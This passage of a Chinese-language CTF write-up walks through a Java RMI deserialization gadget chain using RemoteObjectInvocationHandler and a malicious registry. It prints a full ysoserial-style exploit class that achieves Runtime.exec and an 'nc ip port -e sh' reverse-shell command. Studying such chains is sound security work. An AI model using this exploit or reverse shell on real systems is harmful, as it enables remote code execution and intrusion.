<p>这里的分析其实就是CC1链子的分析网上也有很多文章，接着看到<code>AnonotationType</code>的构造函数。可以看到<code>memberTypes</code>的赋值是在构造函数中实现的。构造函数传的参数是AnnotationInvocationHandler的var0，然后通过反射获取了Annotation对象的所有方法，遍历方法名字赋值给var7，方法返回类型赋值给var8，最后将两者put到memberTypes成员变量中。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220930-9d5fb0be-6c01-1.png"/></p>
<p>所以回到readObject，要进入if里面就需要在HashMap里面put一个Annotation对象的方法名字，这里的Retention为Annotation的一个子类且有一个value的方法。</p>
<p>所以这样的话就只需要往HashMap中put一个键名是"value"的字符串就能进入到if中了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220935-a01926aa-6c01-1.png"/></p>
<p>但是问题又来了，我们能够看到此时var4中存在两个map了，一个map中含有value键名，但另一个还是没有，所以当遍历到键名为getObject的map时还是无法进入到if中就无法获取到map的键值，那最终<code>MemberValues</code>的这个map的键值就是null，所以就会出现在<code>AnnotationInvocationHandler.invoke()</code>函数中从MemberValues获取对象结果为null的问题了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220941-a372ea48-6c01-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220945-a5dcf7b0-6c01-1.png"/></p>
<p>而要解决这个问题就是找到一个Annotation的一个子类，这个子类的所有方法名中有叫<code>getObject</code>的方法。但显然这样的类无法找到。所以还是需要舍弃这个类去寻找新的类了。</p>
<h4 data-content="1" id="c2b76a4a666c35b6b08a4031cec5fdd5">RemoteObjectInvocationHandler</h4>
<p>这个类的寻找也很简单官方wp上直接使用java代码遍历类设置条件筛选出可用的类或者直接使用codeql也很方便</p>
<pre><code>public class FindClass {
    public static void main(String[] args) {
        Reflections reflections = new Reflections();
        Set&lt;Class&lt;? extends InvocationHandler&gt;&gt; subTypesOf =
                reflections.getSubTypesOf(InvocationHandler.class);
        for (Class&lt;? extends InvocationHandler &gt; aClass : subTypesOf) {
            if(Serializable.class.isAssignableFrom(aClass)){
                System.out.println(
                        aClass
                );
            }
        }
    }
}</code></pre>
<pre><code>import java

from Class c 
where c.getASupertype().hasName("InvocationHandler")
    and
    c.getASupertype*() instanceof TypeSerializable
select c</code></pre>
<p><code>RemoteObjectInvocationHandler</code>的invoke方法如下，可以看到这个类最终能调用到ref的invoke方法。<br/>
ref.invoke最终调用到的是StreamRemoteCall#executeCall方法。基本上所有客户端的请求，invoke-&gt;executeCall其实就是一条危险片段链，是rmi攻击手段中经常会见到的类。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220954-ab45f742-6c01-1.png"/></p>
<p>ref其实就是一个远程引用，里面保存着服务端的对象信息。就像我们调用Registry的bind方法时，绑定的也是远程引用。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220959-ae775208-6c01-1.png"/></p>
<p>但是这里还是无法控制返回对象所以还是不能直接替换AnnotationInvocationHandler这个类，但是又有另外一个攻击思路了。</p>
<ul>
<li>首先我们自己实现两个接口然后绑定到注册中心，这样ref中保存的就是我们的自己实现接口后的类。</li>
<li>然后利用RemoteObjectInvocationHandler来代理UserInter接口让题目客户端反序列化时调用的方法是我们自己实现的方法，这样我们在自己实现的类里就能控制返回对象了。</li>
</ul>
<p>例如这样，只需要让题目客户端调用到我们自己实现的类即能控制返回对象。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221005-b2211d8a-6c01-1.png"/></p>
<h2 data-content="1" id="3ed3a1dff5e8a72d20aef99fc9a0f263">最终攻击-rce反序列化链</h2>
<p>最终的链子如下。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">ysoserial.payloads</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.ctf.threermi.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">sun.rmi.server.UnicastRef</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">sun.rmi.transport.LiveRef</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">sun.rmi.transport.tcp.TCPEndpoint</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Gadgets</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.PayloadRunner</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Reflections</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Array</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.server.RemoteObjectInvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.server.RemoteRef</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>


<span class="cm">/*</span>
<span class="cm">/*</span>
<span class="cm">    Gadget chain:</span>
<span class="cm">        Gadget.readObject()</span>
<span class="cm">            UserInter(Proxy).getGirlFriend()</span>
<span class="cm">                RemoteObjectInvocationHandler.invoke()</span>
<span class="cm">                    UnicastRef.invoke()</span>
<span class="cm">                        StreamRemoteCall#executeCall()</span>
<span class="cm">                            UserInter.getGirlFriend()</span>
<span class="cm">                        Templates(Proxy).newTransformer()</span>
<span class="cm">                     MyInvocationHandler.invoke()</span>
<span class="cm">                        FactoryInter(Proxy).getObject()</span>
<span class="cm">                            RemoteObjectInvocationHandler.invoke()</span>
<span class="cm">                                UnicastRef.invoke()</span>
<span class="cm">                                    StreamRemoteCall#executeCall()</span>
<span class="cm">                                        FactoryInter.getObject()</span>
<span class="cm">             Method.invoke()</span>
<span class="cm">                            TemplatesImpl.newTransformer()</span>
<span class="cm">                                TemplatesImpl.getTransletInstance()</span>
<span class="cm">                                    TemplatesImpl.defineTransletClasses()</span>
<span class="cm">                                        TemplatesImpl.TransletClassLoader.defineClass()</span>
<span class="cm">                                            Pwner*(Javassist-generated).&lt;static init&gt;</span>
<span class="cm">                                                Runtime.exec()</span>
<span class="cm"> */</span>
 <span class="o">*/</span>
<span class="kd">class</span> <span class="nc">UserImpl</span> <span class="kd">implements</span> <span class="n">UserInter</span> <span class="o">{</span>
    <span class="n">Registry</span> <span class="n">registry</span><span class="o">;</span>
    <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="mi">7777</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">sayHello</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Friend</span> <span class="nf">getGirlFriend</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
        <span class="n">FactoryInter</span> <span class="n">factoryInter</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span><span class="c1">//annotationInvocationHandler</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">allIfaces</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;[])</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
            <span class="n">allIfaces</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">FactoryInter</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
            <span class="n">allIfaces</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
            <span class="n">factoryInter</span> <span class="o">=</span> <span class="o">(</span><span class="n">FactoryInter</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">FactoryInter</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="n">allIfaces</span><span class="o">,</span><span class="n">Proxy</span><span class="o">.</span><span class="na">getInvocationHandler</span><span class="o">(</span><span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"factory"</span><span class="o">)));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="kd">final</span> <span class="n">MyInvocationHandler</span> <span class="n">myInvocationHandler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyInvocationHandler</span><span class="o">();</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">myInvocationHandler</span><span class="o">,</span><span class="s">"object"</span><span class="o">,</span><span class="n">factoryInter</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="kd">final</span> <span class="n">Friend</span> <span class="n">friend</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createProxy</span><span class="o">(</span><span class="n">myInvocationHandler</span><span class="o">,</span><span class="n">Friend</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">friend</span><span class="o">;</span>


    <span class="o">}</span>
<span class="o">}</span>
<span class="kd">class</span> <span class="nc">FactoryImpl</span> <span class="kd">implements</span> <span class="n">FactoryInter</span><span class="o">{</span>
    <span class="n">String</span> <span class="n">cmd</span><span class="o">;</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cmd</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TCTF3rmiExp</span> <span class="kd">extends</span> <span class="n">PayloadRunner</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">evilServerPort</span> <span class="o">=</span> <span class="mi">7777</span><span class="o">;</span>
        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">evilServerPort</span><span class="o">);</span>
        <span class="n">UserImpl</span> <span class="n">user1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UserImpl</span><span class="o">();</span>
        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"UserImpl"</span><span class="o">,</span> <span class="n">UnicastRemoteObject</span><span class="o">.</span><span class="na">exportObject</span><span class="o">(</span><span class="n">user1</span><span class="o">,</span> <span class="n">evilServerPort</span><span class="o">));</span>
        <span class="n">FactoryImpl</span> <span class="n">factoryImpl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FactoryImpl</span><span class="o">();</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">factoryImpl</span><span class="o">,</span><span class="s">"cmd"</span><span class="o">,</span><span class="n">command</span><span class="o">);</span>
        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"factory"</span><span class="o">,</span> <span class="n">UnicastRemoteObject</span><span class="o">.</span><span class="na">exportObject</span><span class="o">(</span><span class="n">factoryImpl</span><span class="o">,</span> <span class="n">evilServerPort</span><span class="o">));</span>
<span class="c1">//        ((UnicastRef) ((RemoteObjectInvocationHandler) ref).ref).getLiveRef().getEndpoint().getClass()</span>
        <span class="n">InvocationHandler</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">getInvocationHandler</span><span class="o">(</span><span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"UserImpl"</span><span class="o">));</span>

        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span>  <span class="n">ref</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"ref"</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">UnicastRef</span> <span class="n">unicastRef</span> <span class="o">=</span>  <span class="o">(</span><span class="n">UnicastRef</span><span class="o">)</span><span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
        <span class="n">LiveRef</span> <span class="n">liveRef</span> <span class="o">=</span> <span class="o">(</span><span class="n">LiveRef</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">unicastRef</span><span class="o">,</span><span class="s">"ref"</span><span class="o">);</span>
        <span class="n">TCPEndpoint</span> <span class="n">tcpEndpoint</span> <span class="o">=</span> <span class="o">(</span><span class="n">TCPEndpoint</span><span class="o">)</span><span class="n">Reflections</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">liveRef</span><span class="o">,</span><span class="s">"ep"</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">tcpEndpoint</span><span class="o">,</span><span class="s">"host"</span><span class="o">,</span><span class="s">"10.122.207.125"</span><span class="o">);</span>

        <span class="n">RemoteObjectInvocationHandler</span> <span class="n">remoteObjectInvocationHandler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RemoteObjectInvocationHandler</span><span class="o">((</span><span class="n">RemoteRef</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">ref</span><span class="o">,</span><span class="s">"ref"</span><span class="o">));</span>
        <span class="kd">final</span> <span class="n">UserInter</span> <span class="n">user</span> <span class="o">=</span> <span class="o">(</span><span class="n">UserInter</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">UserInter</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">UserInter</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">remoteObjectInvocationHandler</span><span class="o">);</span>
        <span class="n">Gadget</span> <span class="n">gadget</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Gadget</span><span class="o">();</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">gadget</span><span class="o">,</span><span class="s">"user"</span><span class="o">,</span><span class="n">user</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">gadget</span><span class="o">,</span><span class="s">"mName"</span><span class="o">,</span><span class="s">"newTransformer"</span><span class="o">);</span>

        <span class="k">return</span> <span class="n">gadget</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">PayloadRunner</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">TCTF3rmiExp</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p>整体调试一下链子还是很顺利的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221014-b7887930-6c01-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221019-ba370bba-6c01-1.png"/></p>
<p>进入到UnicastRef.invoke()里面首先用newCall方法首先会建立一个连接到对应的RMI服务端。后面其实就是正常客户端获取RMIRegistry对象的流程了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221024-bd6b205a-6c01-1.png"/></p>
<p>StreamRemoteCall初始化会在自己的this.out属性中序列化一些属性进去</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221028-bfcb988e-6c01-1.png"/></p>
<p>然后判断如果方法有参数，调用 marshalValue 将参数写入到输出流，然后调用 executeCall。但我们这里很明显getGirlFriend没有参数所以不进入。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221034-c30825a8-6c01-1.png"/></p>
<p>在executeCall中首先会释放输出流</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221039-c670a3d2-6c01-1.png"/></p>
<p>然后获取服务端返回数据信息</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221045-c9e827b0-6c01-1.png"/></p>
<p>然后读取第一个字节和81进行相等比较，81是在TransportConstants中定义好的代表Return标志位。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221052-cdc85198-6c01-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221100-d2b4f56c-6c01-1.png"/></p>
<p>然后又会读取一个字节。读取的第二个字节会用于下面的流程判断，如果是1的话那么直接return，而如果是2的话，那么会对返回回来的数据进行反序列化（这是一个攻击点，也就是如果服务端返回回来的序列化数据，那么在这里客户端是可以进行反序列化的），其实ysoserial的JRMPListener就是利用的这里，实际上进入到<code>case 2</code>后就是处理TransportConstants.ExceptionalReturn报错情况，所以这也是为什么会说需要将payload放到报错信息中的原因。<br/>
这里很明显我们并没有进入到<code>case 2</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221108-d73daf70-6c01-1.png"/></p>
<p>跳出之后就是通过反序列化获取远程对象了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221112-d9dd5938-6c01-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221117-dcc46a9c-6c01-1.png"/></p>
<p>最后我们能够使用到自己实现的类来控制返回对象，返回一个使用MyInvocationHandler代理了Templates和Friend两个接口的类</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221123-e048965c-6c01-1.png"/></p>
<p>然后通过findMethod就能够找到newTransformer方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221127-e2cf28c8-6c01-1.png"/></p>
<p>然后第二行<code>this.user.getGirlFriend()</code>会进行上面同样的流程返回一个代理对象，然后通过反射调用这个类里面的newTransformer方法。又由于这个被MyInvocationHandler代理过所以会进入到MyInvocationHandler的invoke方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221132-e5d6ce18-6c01-1.png"/></p>
<p>这里只要再控制<code>this.object.getObject()</code>为一个TemplatesImpl实例对象就能成功调用newTransformer方法从而实例恶意字节码执行命令了。<br/>
这里控制返回对象的方法和上面<code>this.user.getGirlFriend()</code>是一摸一样的就不再跟进一遍了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221136-e87af8ec-6c01-1.png"/></p>
<p>rce效果图</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221141-eb4950e6-6c01-1.png"/></p>
<h3 data-content="1" id="62d62fe5f093d426af3448cb25ace5d1">攻击效果</h3>
<p>先绑定恶意对象</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221146-ee666692-6c01-1.png"/></p>
<p>反序列化rce链子，题目docker环境没有curl和bash，但是有nc可能确实是特意给的，所以利用<code>nc ip port -e sh</code>即可反弹shell。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221152-f1881b5e-6c01-1.png"/></p>
<p>最终getshell</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124221156-f3fc64b2-6c01-1.png"/></p>
<p>参考文章<br/>
<a href="http://www.yongsheng.site/2022/07/11/RMI-attack/" target="_blank">http://www.yongsheng.site/2022/07/11/RMI-attack/</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/13517074.html" target="_blank">https://www.cnblogs.com/zpchcbd/p/13517074.html</a></p>
<p><a href="https://www.redmango.top/article/70" target="_blank">https://www.redmango.top/article/70</a></p>
<p><a href="https://tttang.com/archive/1430/" target="_blank">https://tttang.com/archive/1430/</a></p>
<p><a href="https://xie.infoq.cn/article/9a9387805a496e1485dc8430f" target="_blank">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p>
<p><a href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html" target="_blank">https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html</a></p>
</div>
</div>